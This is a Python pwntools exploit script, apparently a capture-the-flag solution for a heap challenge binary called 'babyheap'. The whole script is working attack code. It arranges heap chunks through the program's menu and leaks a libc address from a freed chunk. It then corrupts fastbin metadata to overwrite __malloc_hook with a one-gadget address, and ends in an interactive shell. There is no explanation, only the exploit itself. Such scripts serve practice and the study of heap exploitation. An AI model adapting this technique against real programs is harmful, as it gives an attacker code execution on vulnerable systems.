from pwn import *

p = process("./babyheap")
#libc = ELF("./_libc.so.6")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def Alloc(size,content):
    p.recvuntil("choice: ")
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(size))
    p.recvuntil("content: ")
    p.sendline(str(content))


def Show(idx):
    p.recvuntil("choice: ")
    p.sendline('2')
    p.recvuntil("index: ")
    p.sendline(str(idx))
    #p.recvuntil("Content: ")
    #data = p.recvline()
    #return data

def Delete(idx):
    p.recvuntil("choice: ")
    p.sendline('3')
    p.recvuntil("index: ")
    p.sendline(str(idx))

Alloc(0x88,"A"*120) #0
Alloc(0x100,"B"*1)  #1
Alloc(0xf0,"C"*120) #2 
Alloc(0x80,"K"*1) #3
Alloc(0x100,"F"*1) #4
Alloc(0x100,"C"*1) #5

Delete(1)
Delete(0)
Alloc(0x88,"D"*136) #0  
 
Alloc(0x80,"E"*20)  #1
Alloc(0x60,"F"*0x60)  #6  //evil
Delete(1)
Delete(2)
Delete(4)
Delete(5)
#Delete(6)

Alloc(0x80,"G"*0x80) #1
Alloc(0x100,"G"*0x100) #2
Alloc(0x100,"G"*0x100) #4

Delete(4)
Delete(2)

Show(6)

p.recvuntil("content: ")
leak_addr = u64(p.recv(6)+"\x00\x00")


main_arena_addr = leak_addr - 0x58
lib_addr = leak_addr - libc.symbols['__malloc_hook'] - 0x78 

#print "libc.symbols['__malloc_hook'] = " + hex(libc.symbols['__malloc_hook'])
print "leak_addr= " + hex(leak_addr)
print "lib_addr= " + hex(lib_addr)
#print "main_arena_addr= " + hex(main_arena_addr)
pause()
Delete(0)
Delete(1)
Alloc(0xa8,"A"*0xa7)#0
Alloc(0x80, 'C' * 0x60 + p64(0) + p64(0x71) + p64(0) + p64(0))#1
Alloc(0x50, 'A' * 0x40+p64(0)+p64(0x71))#2
Alloc(0x80, 'A' * 0x80)#4
Alloc(0x80, 'A' * 0x80)#5

Delete(6)
Delete(1)

hook = lib_addr + libc.symbols['__malloc_hook'] - 0x13
#oneshot = lib_addr + 0x4526a
oneshot = lib_addr + 0x4647c  #local

Alloc(0x80, 'C' * 0x60 + p64(0) + p64(0x70) + p64(hook) + p64(0))#1

Alloc(0x60,'A' * 0x60)#6
Alloc(0x60,'A' * 0x3 + p64(oneshot) + "\n")#7

p.interactive()
